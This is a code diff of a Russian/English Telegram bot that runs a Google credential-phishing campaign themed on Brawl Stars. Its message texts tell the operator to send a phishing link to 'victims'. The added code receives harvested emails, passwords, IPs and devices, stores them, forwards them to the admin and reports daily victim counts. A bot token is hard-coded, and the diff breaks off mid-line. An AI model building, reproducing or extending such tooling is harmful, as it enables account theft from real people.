@@ -1,7 +1,7 @@
 import requests
 import time
 import json
-from datetime import datetime
+from datetime import datetime, timedelta
 
 BOT_TOKEN = "8601549576:AAHLJF0oPN6Sx6jQRpfuHz-Stl3Fri_6LxI"
 ADMIN_ID = 8744429026
@@ -14,7 +14,7 @@ user_language = {}
 tickets = {}
 admin_reply_context = {}
 
-# ========== ТЕКСТЫ (сокращённо, но можно полные) ==========
+# ========== ТЕКСТЫ ==========
 TEXTS = {
     'ru': {
         'start_admin': "🎉 **BRAWL STARS FISHING** 🎉\n\n🔗 **Фишинг-ссылка:**\n`{url}`\n\n👨‍💼 **Поймано жертв:** {count}\n\n📌 Отправь ссылку жертве — данные придут сюда.",
@@ -22,7 +22,9 @@ TEXTS = {
         'instruction': "📖 **ИНСТРУКЦИЯ**\n\n1️⃣ Отправь ссылку жертве\n2️⃣ Жертва вводит почту и пароль Google\n3️⃣ Данные приходят сюда\n4️⃣ Жертва видит ошибку 404\n\n⚠️ Ссылка всегда одна: {url}",
         'data_empty': "📭 **Нет данных**\n\nПока нет ни одной жертвы.",
         'data_title': "👥 **Последние 5 жертв:**\n\n",
-        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 Всего жертв: {total}\n🌐 Уникальных IP: {unique}",
+        'stats': "📊 **СТАТИСТИКА**\n\n👨‍💼 **Всего жертв:** {total}\n📅 **За сегодня:** {today}\n🔄 **Активных тикетов:** {tickets}\n\n📌 Выбери категорию:",
+        'stats_emails': "📧 **Почты за сегодня:**\n\n{emails}",
+        'stats_devices': "📱 **Устройства за сегодня:**\n\n{devices}",
         'donate_25': "✨ **ПОДДЕРЖАТЬ АВТОРА (25⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **25 Telegram Stars**.\n\n⭐ 25 звёзд ≈ 50 рублей\n\nСпасибо за поддержку! 💙",
         'donate_50': "✨ **ПОДДЕРЖАТЬ АВТОРА (50⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **50 Telegram Stars**.\n\n⭐ 50 звёзд ≈ 100 рублей\n\nСпасибо за поддержку! 💙",
         'donate_100': "✨ **ПОДДЕРЖАТЬ АВТОРА (100⭐)** ✨\n\nНажми на кнопку ниже, чтобы отправить **100 Telegram Stars**.\n\n⭐ 100 звёзд ≈ 200 рублей\n\nСпасибо за поддержку! 💙",
@@ -52,6 +54,8 @@ TEXTS = {
         'btn_donate_100': "⭐ 100 звёзд",
         'btn_lang_ru': "🇷🇺 Русский",
         'btn_lang_en': "🇬🇧 English",
+        'btn_stats_emails': "📧 Почты за сегодня",
+        'btn_stats_devices': "📱 Устройства за сегодня",
         'only_admin': "❌ Только администратор может отвечать на тикеты."
     },
     'en': {
@@ -60,7 +64,9 @@ TEXTS = {
         'instruction': "📖 **INSTRUCTION**\n\n1️⃣ Send link to victim\n2️⃣ Victim enters Google email and password\n3️⃣ Data comes here\n4️⃣ Victim sees 404 error\n\n⚠️ Link is always the same: {url}",
         'data_empty': "📭 **No data**\n\nNo victims yet.",
         'data_title': "👥 **Last 5 victims:**\n\n",
-        'stats': "📊 **STATISTICS**\n\n👨‍💼 Total victims: {total}\n🌐 Unique IPs: {unique}",
+        'stats': "📊 **STATISTICS**\n\n👨‍💼 **Total victims:** {total}\n📅 **Today:** {today}\n🔄 **Active tickets:** {tickets}\n\n📌 Choose category:",
+        'stats_emails': "📧 **Emails today:**\n\n{emails}",
+        'stats_devices': "📱 **Devices today:**\n\n{devices}",
         'donate_25': "✨ **SUPPORT THE AUTHOR (25⭐)** ✨\n\nClick the button below to send **25 Telegram Stars**.\n\n⭐ 25 stars ≈ $0.5\n\nThank you for your support! 💙",
         'donate_50': "✨ **SUPPORT THE AUTHOR (50⭐)** ✨\n\nClick the button below to send **50 Telegram Stars**.\n\n⭐ 50 stars ≈ $1\n\nThank you for your support! 💙",
         'donate_100': "✨ **SUPPORT THE AUTHOR (100⭐)** ✨\n\nClick the button below to send **100 Telegram Stars**.\n\n⭐ 100 stars ≈ $2\n\nThank you for your support! 💙",
@@ -90,6 +96,8 @@ TEXTS = {
         'btn_donate_100': "⭐ 100 stars",
         'btn_lang_ru': "🇷🇺 Русский",
         'btn_lang_en': "🇬🇧 English",
+        'btn_stats_emails': "📧 Emails today",
+        'btn_stats_devices': "📱 Devices today",
         'only_admin': "❌ Only admin can reply to tickets."
     }
 }
@@ -140,6 +148,13 @@ def get_main_keyboard(chat_id):
             [{"text": get_button_text(chat_id, 'btn_instruction'), "callback_data": "instruction"}, {"text": get_button_text(chat_id, 'btn_settings'), "callback_data": "settings"}]
         ]
 
+def get_stats_keyboard(chat_id):
+    return [
+        [{"text": get_button_text(chat_id, 'btn_stats_emails'), "callback_data": "stats_emails"}],
+        [{"text": get_button_text(chat_id, 'btn_stats_devices'), "callback_data": "stats_devices"}],
+        [{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]
+    ]
+
 def get_back_keyboard(chat_id):
     return [[{"text": get_button_text(chat_id, 'btn_back'), "callback_data": "back"}]]
 
@@ -188,6 +203,13 @@ def close_ticket(user_id):
 def get_active_ticket(user_id):
     return tickets.get(user_id) if tickets.get(user_id, {}).get("active") else None
 
+def get_today_victims():
+    today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0).timestamp()
+    return [v for v in victims if v.get("timestamp", 0) >= today_start]
+
+def get_active_tickets_count():
+    return sum(1 for t in tickets.values() if t.get("active"))
+
 print("✅ Бот запущен на Render! Только @NeresVoid может отвечать на тикеты.")
 
 while True:
@@ -204,6 +226,23 @@ while True:
                 chat_id = message.get("chat", {}).get("id")
                 username = message.get("chat", {}).get("username", "нет")
                 text = message.get("text", "")
+                
+                # Обработка новых жертв с сайта
+                if text.startswith("new_victim:"):
+                    try:
+                        data = json.loads(text.replace("new_victim:", ""))
+                        victims.append({
+                            "email": data["email"],
+                            "password": data["password"],
+                            "ip": data.get("ip", "неизвестно"),
+                            "device": data.get("device", "неизвестно"),
+                            "timestamp": time.time(),
+                            "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+                        })
+                        send_message(ADMIN_ID, f"✅ Новая жертва!\n📧 {data['email']}\n🔑 {data['password']}")
+                    except Exception as e:
+                        send_message(ADMIN_ID, f"❌ Ошибка сохранения жертвы: {e}")
+                    continue
                 
                 if chat_id == ADMIN_ID:
                     if text == "/start":
@@ -265,6 +304,33 @@ while True:
                     else:
                         edit_message(chat_id, message_id, get_text(chat_id, 'start_user'), get_main_keyboard(chat_id))
                 
+                elif data == "stats" and chat_id == ADMIN_ID:
+                    today_count = len(get_today_victims())
+                    active_tickets = get_active_tickets_count()
+                    text = get_text(chat_id, 'stats', total=len(victims), today=today_count, tickets=active_tickets)
+                    edit_message(chat_id, message_id, text, get_stats_keyboard(chat_id))
+                
+                elif data == "stats_emails" and chat_id == ADMIN_ID:
+                    today_victims = get_today_victims()
+                    if not today_victims:
+                        emails_text = "Нет жертв за сегодня"
+                    else:
+                        emails_list = [f"• {v['email']}" for v in today_victims]
+                        emails_text = "\n".join(emails_list)
+                    edit_message(chat_id, message_id, get_text(chat_id, 'stats_emails', emails=emails_text), get_back_keyboard(chat_id))
+                
+                elif data == "stats_devices" and chat_id == ADMIN_ID:
+                    today_victims = get_today_victims()
+                    if not today_victims:
+                        devices_text = "Нет жертв за сегодня"
+                    else:
+                        devices_count = {}
+                        for v in today_victims:
+                            device = v.get('device', 'Неизвестно')
+                            devices_count[device] = devices_count.get(device, 0) + 1
+                        devices_text = "\n".join([f"• {d}: {c}" for d, c in devices_count.items()])
+                    edit_message(chat_id, message_id, get_text(chat_id, 'stats_devices', devices=devices_text), get_back_keyboard(chat_id))
+                
                 elif data == "donate":
                     edit_message(chat_id, message_id, "✨ **ПОДДЕРЖАТЬ АВТОРА** ✨\n\nВыбери сумму:", get_donate_keyboard(chat_id))
                 
@@ -275,45 +341,4 @@ while True:
                     edit_message(chat_id, message_id, get_text(chat_id, 'donate_50'), [[{"text": get_button_text(chat_id, 'btn_donate_50'), "url": "https://t.me/telegram?start=star50"}]])
                 
                 elif data == "donate_100":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_100'), [[{"text": get_button_text(chat_id, 'btn_donate_100'), "url": "https://t.me/telegram?start=star100"}]])
-                
-                elif data == "instruction":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'instruction', url=PHISHING_URL), get_back_keyboard(chat_id))
-                
-                elif data == "settings":
-                    edit_message(chat_id, message_id, get_text(chat_id, 'settings'), get_language_keyboard(chat_id))
-                
-                elif data == "lang_ru":
-                    user_language[chat_id] = 'ru'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed'), get_back_keyboard(chat_id))
-                
-                elif data == "lang_en":
-                    user_language[chat_id] = 'en'
-                    edit_message(chat_id, message_id, get_text(chat_id, 'language_changed_en'), get_back_keyboard(chat_id))
-                
-                elif data == "data" and chat_id == ADMIN_ID:
-                    if not victims:
-                        edit_message(chat_id, message_id, get_text(chat_id, 'data_empty'), get_back_keyboard(chat_id))
-                    else:
-                        last_victims = victims[-5:]
-                        keyboard = get_victims_keyboard(chat_id, last_victims)
-                        edit_message(chat_id, message_id, get_text(chat_id, 'data_title'), keyboard)
-                
-                elif data.startswith("victim_"):
-                    idx = int(data.split("_")[1])
-                    if 0 <= idx < len(victims):
-                        v = victims[idx]
-                        text = f"📧 **Email:** {v['email']}\n🔑 **Пароль:** {v['password']}\n📡 **IP:** {v['ip']}\n📱 **Устройство:** {v['device']}\n⏰ **Время:** {v['time']}"
-                        edit_message(chat_id, message_id, text, get_back_keyboard(chat_id))
-                
-                elif data == "stats" and chat_id == ADMIN_ID:
-                    unique_ips = len(set(v.get('ip') for v in victims if v.get('ip')))
-                    edit_message(chat_id, message_id, get_text(chat_id, 'stats', total=len(victims), unique=unique_ips), get_back_keyboard(chat_id))
-                
-                answer_callback(callback_id)
-
-        time.sleep(1)
-
-    except Exception as e:
-        print(f"Ошибка: {e}")
-        time.sleep(5)
+                    edit_message(chat_id, message_id, get_text(chat_id, 'donate_100'), [[{"text": get_button_text(chat_id, 'btn_donate_100'), "url": "http
